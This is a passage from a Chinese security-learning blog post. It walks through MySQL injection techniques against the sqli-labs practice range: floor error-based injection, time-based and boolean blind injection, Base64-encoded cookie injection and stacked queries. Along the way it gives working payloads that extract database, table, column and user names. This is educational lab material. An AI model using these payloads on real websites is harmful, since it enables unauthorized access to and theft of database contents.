class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> concat((<span class="keyword">select</span> database()),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)c)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 爆出所有的数据库 通过 limit 来控制</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select 1 from (select concat((select schema_name from information_schema.schemata limit 4,1),ceil(rand(0)*2))x,count(*) from information_schema.tables group by x)c)--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 爆出表名</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">ceil</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)c)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 爆出字段</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select 1 from (select concat((select column_name from information_schema.columns where table_name=&#x27;</span><span class="keyword">user</span><span class="string">&#x27; limit 0,1),ceil(rand(0)*2))x,count(*) from information_schema.tables group by x)c)--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 爆出数据</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> concat((<span class="keyword">select</span> username <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">ceil</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)c)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>当页面输入数据无论正确与否，都毫无差别时，使用延时注入的方法。</p>
+<h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sleep()                                          -- sleep 函数可以使计算机程序（进程，任务或线程）进入休眠</span><br><span class="line"></span><br><span class="line">if()                                             -- if 是计算机编程语言一个关键字，分支结构的一种</span><br><span class="line"></span><br><span class="line">length(database())=8                             -- 判断长度</span><br><span class="line"></span><br><span class="line">mid(a, b, c)                                     -- 从 b 开始，截取 a 字符串的 c 位，可以截取数组之类的</span><br><span class="line"></span><br><span class="line">substr(a, b, c)                                  -- 从 b 开始，截取字符串 a 的 c 长度，只能截取字符串</span><br><span class="line"></span><br><span class="line">left(a, b)                                       -- left(a,b) 从左侧截取 a 的前 b 位</span><br><span class="line"></span><br><span class="line">ord/ascii                                        -- 判断 ascii 值，防止编码或引号被转义的问题</span><br></pre></td></tr></table></figure>
+
+<p>以 sqli-labs 第 9 关为例，演示流程，<code>sleep()</code> 函数的效果就是页面一直刷新，刷新几秒之后再响应。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 判断数据库名长度</span><br><span class="line"></span><br><span class="line">2. 按位截取数据库名每一位字母进行判断</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and sleep(if(length(database())=8, 3, 0)) --+              -- 数据库名长度为 8，页面休眠 3 秒，否则无休眠</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> sleep(if(ord(mid(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span>, <span class="number">3</span>, <span class="number">0</span>)) <span class="comment">--+      -- 依次判断字母，要截取 8 次，判断 8 次</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其实并不推荐延时注入的方法，页面的响应受很多因素影响，最简单的网速就可能使页面响应很久。</p>
+</blockquote>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>Web 页面仅仅会返回 True 和 False，布尔盲注就是根据页面返回的 True 或 False 来获得数据库信息。</p>
+<p>Sqli-labs 第 5 关，返回 True 时：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260501165037858.png"></p>
+<p>返回 False 时：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260501165102005.png"></p>
+<p>既然页面会返回 True 和 False 就相当于自带了 if 语句，语句就变得简单一点了。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())=8 --+                             -- 判断数据库名长度</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span> <span class="comment">--+                   -- 判断第一个字母 ascii 是否为 115（是否为 &#x27;s&#x27;）</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="加解密"><a href="#加解密" class="headerlink" title="加解密"></a>加解密</h2><p>网络中进行数据传输基本都要进行加密，其中 Base64 是最常用的加密方式。</p>
+<p>sqli-labs 第 21 关，针对 cookie 加密注入，admin&#x2F;admin 登录后，抓包查看到 cookie 字段加密。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260501215457519.png"></p>
+<p>将字符串复制，使用 Burp Suite 自带的解密模块 Decoder 进行解密，%3D 代表 ‘&#x3D;’。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260501215917212.png"></p>
+<p>将一条报错注入语句进行 Base64 加密：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; or extractvalue(1, concat(0x7e, (database()), 0x7e)) or&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260501221117480.png"></p>
+<p>将数据包发送 Repeater 模块，将加密过的语句进行拼接。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260501221349155.png"></p>
+<p>拿到了想要查询的数据。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260501221436331.png"></p>
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>在 SQL 语句中，<code>;</code> 是用来表示一条语句的结束，如果我们拼接了 <code>;</code> ，再加一条新语句，就能执行想执行的任意语句了。</p>
+<p>以 Sqli-labs 第 38 关为例，我们插入一条数据：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260501223325865.png"></p>
+<p>页面并不会回显，我们直接进行数据查询：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yunkun18/picgodemo/img/20260501223656068.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://blog.yunkun.top">yunkun18</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://blog.yunkun.top/archives/ed3813fa.html">https://blog.yunkun.top/archives/ed3813fa.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://blog.yunkun.top" target="_blank">北炫一辈子爱(欺负)潼潼ヾ(≧▽≦*)o</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%C2%B7Web%E5%AE%89%E5%85%A8/">网络安全·Web安全</a></div><div class="post-share"><div class="social-share" data-image="/./img/sql_injection.jpg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/archives/6d6b02d2.html" title="Sqli-labs靶场搭建"><img class="cover" src="/./img/sql_injection.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Sqli-labs靶场搭建</div></div><div class="info-2"><div class="info-item-1">Sqli-labs靶场搭建</div></div></div></a><a class="pagination-related" href="/archives/b3af1734.html" title="图形推理"><img class="cover" src="https://jsd.012700.xyz/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">图形推理</div></div><div class="info-2"><div class="info-item-1">图形推理技巧笔记</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/archives/6d6b02d2.html" title="Sqli-labs靶场搭建"><img class="cover" src="/./img/sql_injection.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-23</div><div class="info-item-2">Sqli-labs靶场搭建</div></div><div class="info-2"><div class="info-item-1">Sqli-labs靶场搭建</div></div></div></a><a class="pagination-related" href="/archives/667bd3bf.html" title="CSRF漏洞渗透与防御"><img class="cover" src="/./img/CSRF.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-05</div><div class="info-item-2">CSRF漏洞渗透与防御</div></div><div class="info-2"><div class="info-item-1">CSRF漏洞渗透与防御</div></div></div></a><a class="pagination-related" href="/archives/9508da4a.html" title="浏览器常用插件合集"><img class="cover" src="/./img/plug_in.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-27</div><div class="info-item-2">浏览器常用插件合集</div></div><div class="info-2"><div class="info-item-1">浏览器常用插件合集</div></div></div></a><a class="pagination-related" href="/archives/f39b7ce2.html" title="BurpSuite安装和使用"><img class="cover" src="/./img/tools.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-04-26</div><div class="info-item-2">BurpSuite安装和使用</div></div><div class="info-2"><div class="info-item-1">BurpSuite安装和使用</div></div></div></a><a class="pagination-related" href="/archives/ea185739.html" title="Sql注入之sqlmap的使用"><img class="cover" src="/./img/sql_injection.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-05-07</div><div class="info-item-2">Sql注入之sqlmap的使用</div></div><div class="info-2"><div class="info-item-1">Sql注入之sqlmap的使用</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/./img/auther.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">yunkun18</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/yunkun18"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E5%85%88%E8%A1%8C%E7%AF%87"><span class="toc-number">1.</span> <span class="toc-text">SQL注入先行篇</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">数据库概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.1.</span> <span class="toc-text">关系型数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E5%85%B3%E7%B3%BB%E5%9E%8B%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.1.2.</span> <span class="toc-text">非关系型数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B1%82%E7%BA%A7"><span class="toc-number">1.1.3.</span> <span class="toc-text">常见的数据库层级</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81-SQL-%E8%AF%AD%E6%B3%95"><span class="toc-number">1.1.4.</span> <span class="toc-text">常见 SQL 语法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0"><span class="toc-number">1.2.</span> <span class="toc-text">SQL 注入概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-%E8%87%AA%E5%B8%A6%E7%B3%BB%E7%BB%9F%E5%BA%93"><span class="toc-number">1.3.</span> <span class="toc-text">MySQL 自带系统库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#information-schema-%E5%BA%93"><span class="toc-number">1.3.1.</span> <span class="toc-text">information_schema 库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#performance-schema-%E5%BA%93"><span class="toc-number">1.3.2.</span> <span class="toc-text">performance_schema 库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql-%E5%BA%93"><span class="toc-number">1.3.3.</span> <span class="toc-text">mysql 库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sys-%E5%BA%93"><span class="toc-number">1.3.4.</span> <span class="toc-text">sys 库</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80%E4%B8%8E%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SQL 注入基础与手工注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%95%B0%E6%8D%AE%E4%BC%A0%E9%80%92%E9%80%BB%E8%BE%91"><span class="toc-number">2.1.</span> <span class="toc-text">数据库数据传递逻辑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B"><span class="toc-number">2.2.</span> <span class="toc-text">SQL 注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">2.2.1.</span> <span class="toc-text">判断注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8C%9C%E8%A7%A3%E5%88%97%E6%95%B0%E9%87%8F%EF%BC%9AORDER-BY"><span class="toc-number">2.2.2.</span> <span class="toc-text">猜解列数量：ORDER BY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E7%8C%9C%E8%A7%A3%EF%BC%8C%E5%88%A4%E6%96%AD%E5%9B%9E%E6%98%BE%E7%82%B9"><span class="toc-number">2.2.3.</span> <span class="toc-text">报错猜解，判断回显点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.2.4.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%96%B0%E6%89%8B%E5%8F%A3%E8%AF%80"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">新手口诀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%BE%E8%A1%A8%E6%B3%95"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">图表法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-SQL-%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E6%B3%A8%E5%85%A5%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.2.5.</span> <span class="toc-text">使用 SQL 语句进行注入查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">2.3.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC"><span class="toc-number">2.3.1.</span> <span class="toc-text">查询数据库版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="toc-number">2.3.2.</span> <span class="toc-text">查询数据库名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%89%80%E6%9C%89%E8%A1%A8%E5%90%8D"><span class="toc-number">2.3.3.</span> <span class="toc-text">查询当前数据库的所有表名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E9%87%8D%E8%A6%81%E8%A1%A8%E4%B8%AD%E7%9A%84%E6%89%80%E6%9C%89%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="toc-number">2.3.4.</span> <span class="toc-text">查询重要表中的所有字段名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E6%8D%AE%E6%94%B6%E9%9B%86%E5%88%B0%E7%9A%84%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2-users-%E8%A1%A8%E6%95%B0%E6%8D%AE"><span class="toc-number">2.3.5.</span> <span class="toc-text">根据收集到的信息查询 users 表数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="toc-number">2.4.</span> <span class="toc-text">手工注入总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E9%AB%98%E6%9D%83%E9%99%90%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">SQL注入之高权限注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7"><span class="toc-number">3.1.</span> <span class="toc-text">数据库高权限用户</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AB%98%E6%9D%83%E9%99%90%E7%94%A8%E6%88%B7%E7%9A%84%E6%B3%A8%E5%85%A5%E6%93%8D%E4%BD%9C"><span class="toc-number">3.2.</span> <span class="toc-text">高权限用户的注入操作</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%BA%93%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.2.1.</span> <span class="toc-text">跨库查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">3.2.2.</span> <span class="toc-text">文件读写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">3.2.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6"><span class="toc-number">3.2.2.2.</span> <span class="toc-text">条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">3.2.3.</span> <span class="toc-text">读取文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux-%E6%A0%B8%E5%BF%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">3.2.3.1.</span> <span class="toc-text">Linux 核心敏感文件路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows-%E6%A0%B8%E5%BF%83%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84"><span class="toc-number">3.2.3.2.</span> <span class="toc-text">Windows 核心敏感文件路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%B9%B3%E5%8F%B0%E9%80%9A%E7%94%A8%E7%BD%91%E7%AB%99%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%EF%BC%88%E6%89%BE%E5%88%B0%E4%BA%86%E5%B0%B1%E5%BF%85%E7%9C%8B%EF%BC%89"><span class="toc-number">3.2.3.3.</span> <span class="toc-text">全平台通用网站配置文件（找到了就必看）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="toc-number">3.2.4.</span> <span class="toc-text">文件写入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.3.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E4%B9%8B%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%92%8C%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">SQL之数据类型和提交方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.1.</span> <span class="toc-text">SQL 注入的数据类型</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">4.1.1.</span> <span class="toc-text">数字型注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">4.1.2.</span> <span class="toc-text">字符型注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E7%B3%8A%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">4.1.3.</span> <span class="toc-text">模糊查询注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XX-%E5%9E%8B%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">4.1.4.</span> <span class="toc-text">XX 型注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">4.1.5.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E7%9A%84%E6%95%B0%E6%8D%AE%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F"><span class="toc-number">4.2.</span> <span class="toc-text">SQL 注入的数据提交方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-%E6%8F%90%E4%BA%A4"><span class="toc-number">4.2.1.</span> <span class="toc-text">GET 提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST-%E6%8F%90%E4%BA%A4"><span class="toc-number">4.2.2.</span> <span class="toc-text">POST 提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Header-%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.3.</span> <span class="toc-text">HTTP Header 注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-number">5.</span> <span class="toc-text">SQL注入之注入手法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F"><span class="toc-number">5.1.</span> <span class="toc-text">查询方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#select-%E6%9F%A5%E8%AF%A2"><span class="toc-number">5.1.1.</span> <span class="toc-text">select 查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#update-%E6%9B%B4%E6%96%B0"><span class="toc-number">5.1.2.</span> <span class="toc-text">update 更新</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#insert-%E6%8F%92%E5%85%A5"><span class="toc-number">5.1.3.</span> <span class="toc-text">insert 插入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete-%E5%88%A0%E9%99%A4"><span class="toc-number">5.1.4.</span> <span class="toc-text">delete 删除</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">5.2.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#updatexml"><span class="toc-number">5.2.1.</span> <span class="toc-text">updatexml</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#extractvalue"><span class="toc-number">5.2.2.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#floor"><span class="toc-number">5.2.3.</span> <span class="toc-text">floor</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="toc-number">5.3.</span> <span class="toc-text">延时注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">5.3.1.</span> <span class="toc-text">常用函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.4.</span> <span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="toc-number">5.5.</span> <span class="toc-text">加解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">5.6.</span> <span class="toc-text">堆叠注入</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/4a17b156.html" title="博客说明"><img src="https://jsd.012700.xyz/gh/jerryc127/CDN@latest/cover/default_bg2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="博客说明"/></a><div class="content"><a class="title" 